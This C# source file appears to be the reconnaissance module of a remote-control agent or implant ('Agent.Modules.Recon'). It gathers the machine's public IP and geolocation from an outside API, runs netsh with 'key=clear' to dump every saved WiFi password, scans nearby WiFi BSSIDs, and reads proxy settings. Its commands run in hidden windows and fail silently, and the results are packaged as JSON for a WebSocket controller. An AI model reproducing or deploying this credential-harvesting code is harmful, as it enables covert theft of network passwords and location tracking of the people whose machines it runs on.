using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;

namespace LibraNextgen.Agent.Modules.Recon;

public static class NetworkInfo
{
    private static string? _cachedGeoJson;
    private static readonly object _geoLock = new();

    /// <summary>
    /// Fetch geo info once and cache in memory. Call at agent startup.
    /// Returns the geo JSON for the agent.geo.update WS message.
    /// </summary>
    public static async Task<string?> WarmupGeoAsync()
    {
        if (_cachedGeoJson != null) return _cachedGeoJson;

        try
        {
            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var resp = await client.GetStringAsync("https://uapis.cn/api/v1/network/myip");
            lock (_geoLock)
            {
                _cachedGeoJson = resp;
            }
            return resp;
        }
        catch { return null; }
    }

    public static async Task<string> CollectAsync()
    {
        // WAN (uses cached geo if available)
        var wan = await CollectWanAsync();

        // WiFi — saved profiles with passwords (Windows only)
        var wifi = OperatingSystem.IsWindows() ? CollectWifi() : "[]";

        // Nearby WiFi BSSID scan (Windows only)
        var nearbyWifi = OperatingSystem.IsWindows() ? CollectWifiBssid() : "[]";

        // Proxy
        var proxy = OperatingSystem.IsWindows() ? CollectProxy() : CollectProxyLinux();

        var dns = Escape(IPGlobalProperties.GetIPGlobalProperties().DomainName);

        return $$"""
            {"interfaces":[],
            "wan":{{wan}},
            "wifi":{{wifi}},
            "nearbyWifi":{{nearbyWifi}},
            "proxy":{{proxy}},
            "dnsSuffix":"{{dns}}"}
            """;
    }

    // ── WAN ─────────────────────────────────────────────────────────────────

    private static async Task<string> CollectWanAsync()
    {
        string? gateway = null;

        // Default gateway
        try
        {
            foreach (var n in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (n.OperationalStatus != OperationalStatus.Up) continue;
                var gateways = n.GetIPProperties().GatewayAddresses;
                foreach (var g in gateways)
                {
                    if (g.Address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        gateway = g.Address.ToString();
                        break;
                    }
                }
                if (gateway != null) break;
            }
        }
        catch { /* ignore */ }

        // Use cached geo data if available
        string cached;
        lock (_geoLock) { cached = _cachedGeoJson ?? ""; }

        if (!string.IsNullOrEmpty(cached))
        {
            // Parse cached geo JSON and merge with gateway
            try
            {
                var parts = new List<string>();
                var ip = ExtractJsonString(cached, "ip");
                var region = ExtractJsonString(cached, "region")?.Trim();
                var isp = ExtractJsonString(cached, "isp");
                var asn = ExtractJsonString(cached, "asn");
                var llc = ExtractJsonString(cached, "llc");
                var lat = ExtractJsonNumber(cached, "latitude");
                var lng = ExtractJsonNumber(cached, "longitude");

                parts.Add($"\"publicIp\":\"{Escape(ip ?? "unavailable")}\"");
                parts.Add($"\"gateway\":\"{Escape(gateway ?? "unknown")}\"");
                parts.Add($"\"region\":\"{Escape(region ?? "")}\"");
                parts.Add($"\"isp\":\"{Escape(isp ?? "")}\"");
                parts.Add($"\"asn\":\"{Escape(asn ?? "")}\"");
                parts.Add($"\"llc\":\"{Escape(llc ?? "")}\"");
                parts.Add($"\"latitude\":{lat}");
                parts.Add($"\"longitude\":{lng}");

                return $"{{{string.Join(",", parts)}}}";
            }
            catch { /* fall through */ }
        }

        return $$"""
            {"publicIp":"{{Escape("unavailable")}}",
            "gateway":"{{Escape(gateway ?? "unknown")}}",
            "region":"","isp":"","asn":"","llc":"","latitude":0,"longitude":0}
            """;
    }

    // ── WiFi (Windows) ─────────────────────────────────────────────────────

    private static string CollectWifi()
    {
        var profiles = new List<string>();

        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = "wlan show profiles",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return "[]";
            proc.WaitForExit(5000);
            var output = proc.StandardOutput.ReadToEnd();

            var profileNames = new List<string>();
            foreach (var line in output.Split('\n'))
            {
                var trimmed = line.Trim();
                if (trimmed.StartsWith(": "))
                {
                    profileNames.Add(trimmed[2..].Trim());
                }
                else if (trimmed.Contains(":"))
                {
                    var parts = trimmed.Split(":", 2);
                    if (parts.Length == 2 && parts[0].Trim().Equals("All User Profile", StringComparison.OrdinalIgnoreCase))
                    {
                        profileNames.Add(parts[1].Trim());
                    }
                }
            }

            foreach (var name in profileNames)
            {
                try
                {
                    var psi2 = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"wlan show profile name=\"{name}\" key=clear",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    using var proc2 = Process.Start(psi2);
                    if (proc2 == null) continue;
                    proc2.WaitForExit(3000);
                    var detail = proc2.StandardOutput.ReadToEnd();

                    string? password = null;
                    foreach (var line in detail.Split('\n'))
                    {
                        var t = line.Trim();
                        if (t.Contains("Key Content") && t.Contains(":"))
                        {
                            password = t.Split(":", 2)[1].Trim();
                            break;
                        }
                    }

                    profiles.Add($$"""{"ssid":"{{Escape(name)}}","password":"{{Escape(password ?? "")}}"}""");
                }
                catch { /* skip this profile */ }
            }
        }
        catch { /* ignore */ }

        return $"[{string.Join(",", profiles)}]";
    }

    // ── Nearby WiFi BSSID scan (Windows) ───────────────────────────────────

    private static string CollectWifiBssid()
    {
        var networks = new List<string>();

        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = "wlan show networks mode=bssid",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return "[]";
            proc.WaitForExit(8000);
            var output = proc.StandardOutput.ReadToEnd();

            // Parse SSID sections
            var sections = output.Split("SSID ", StringSplitOptions.RemoveEmptyEntries);
            foreach (var section in sections)
            {
                var lines = section.Split('\n');
                if (lines.Length < 2) continue;

                // First line: "1 : MyNetwork" or similar
                var colonIdx = lines[0].IndexOf(':');
                if (colonIdx < 0) continue;
                var ssid = lines[0][(colonIdx + 1)..].Trim();
                if (string.IsNullOrEmpty(ssid)) continue;

                var auth = "";
                var encryption = "";
                string? currentBssid = null;

                foreach (var line in lines)
                {
                    var t = line.Trim();
                    if (t.StartsWith("Authentication", StringComparison.OrdinalIgnoreCase))
                        auth = ExtractAfterColon(t);
                    else if (t.StartsWith("Encryption", StringComparison.OrdinalIgnoreCase))
                        encryption = ExtractAfterColon(t);
                    else if (t.StartsWith("BSSID", StringComparison.OrdinalIgnoreCase))
                        currentBssid = ExtractAfterColon(t);
                    else if (t.StartsWith("Signal", StringComparison.OrdinalIgnoreCase))
                    {
                        var signal = ExtractAfterColon(t).Replace("%", "").Trim();
                        networks.Add($$"""
                            {"ssid":"{{Escape(ssid)}}",
                            "auth":"{{Escape(auth)}}",
                            "encryption":"{{Escape(encryption)}}",
                            "bssid":"{{Escape(currentBssid ?? "")}}",
                            "signal":"{{Escape(signal)}}"}
                            """);
                    }
                }
            }
        }
        catch { /* ignore */ }

        return $"[{string.Join(",", networks)}]";
    }

    // ── Proxy (Windows) ────────────────────────────────────────────────────

    private static string CollectProxy()
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "reg",
                Arguments = @"query ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings""",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return DefaultProxyJson();
            proc.WaitForExit(3000);
            var output = proc.StandardOutput.ReadToEnd();

            var enabled = false;
            var server = "";
            var bypass = "";

            foreach (var line in output.Split('\n'))
            {
                var t = line.Trim();
                if (t.Contains("ProxyEnable"))
                {
                    if (t.Contains("0x1")) enabled = true;
                }
                else if (t.Contains("ProxyServer") && t.Contains("REG_SZ"))
                {
                    var sep = t.IndexOf("REG_SZ");
                    server = t[(sep + "REG_SZ".Length)..].Trim();
                }
                else if (t.Contains("ProxyOverride") && t.Contains("REG_SZ"))
                {
                    var sep = t.IndexOf("REG_SZ");
                    bypass = t[(sep + "REG_SZ".Length)..].Trim();
                }
            }

            var port = 0;
            if (server.Contains(":"))
            {
                var parts = server.Split(":");
                if (parts.Length == 2 && int.TryParse(parts[1], out var p))
                    port = p;
            }

            return $$"""
                {"enabled":{{enabled.ToString().ToLowerInvariant()}},
                "server":"{{Escape(server)}}",
                "port":{{port}},
                "bypass":"{{Escape(bypass)}}"}
                """;
        }
        catch { /* ignore */ }
        return DefaultProxyJson();
    }

    private static string DefaultProxyJson() =>
        """{"enabled":false,"server":"","port":0,"bypass":""}""";

    // ── Proxy (Linux) ──────────────────────────────────────────────────────

    private static string CollectProxyLinux()
    {
        var httpProxy = Environment.GetEnvironmentVariable("HTTP_PROXY")
                     ?? Environment.GetEnvironmentVariable("http_proxy") ?? "";
        var httpsProxy = Environment.GetEnvironmentVariable("HTTPS_PROXY")
                       ?? Environment.GetEnvironmentVariable("https_proxy") ?? "";
        var noProxy = Environment.GetEnvironmentVariable("NO_PROXY")
                    ?? Environment.GetEnvironmentVariable("no_proxy") ?? "";

        var allProxy = !string.IsNullOrEmpty(httpsProxy) ? httpsProxy : httpProxy;
        return $$"""
            {"enabled":{{(!string.IsNullOrEmpty(allProxy)).ToString().ToLowerInvariant()}},
            "server":"{{Escape(allProxy ?? "")}}",
            "port":0,
            "bypass":"{{Escape(noProxy)}}"}
            """;
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private static string ExtractJsonString(string json, string key)
    {
        var search = $"\"{key}\":\"";
        var start = json.IndexOf(search, StringComparison.Ordinal);
        if (start < 0)
        {
            // Try with space after colon
            search = $"\"{key}\": \"";
            start = json.IndexOf(search, StringComparison.Ordinal);
        }
        if (start < 0) return "";
        start += search.Length;
        var end = json.IndexOf('"', start);
        return end > start ? json[start..end] : "";
    }

    private static string ExtractJsonNumber(string json, string key)
    {
        var search = $"\"{key}\":";
        var start = json.IndexOf(search, StringComparison.Ordinal);
        if (start < 0) return "0";
        start += search.Length;
        while (start < json.Length && (json[start] == ' ' || json[start] == '"')) start++;
        var end = start;
        while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '.' || json[end] == '-')) end++;
        return end > start ? json[start..end] : "0";
    }

    private static string ExtractAfterColon(string s)
    {
        var idx = s.IndexOf(':');
        return idx >= 0 ? s[(idx + 1)..].Trim() : "";
    }

    private static string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
}
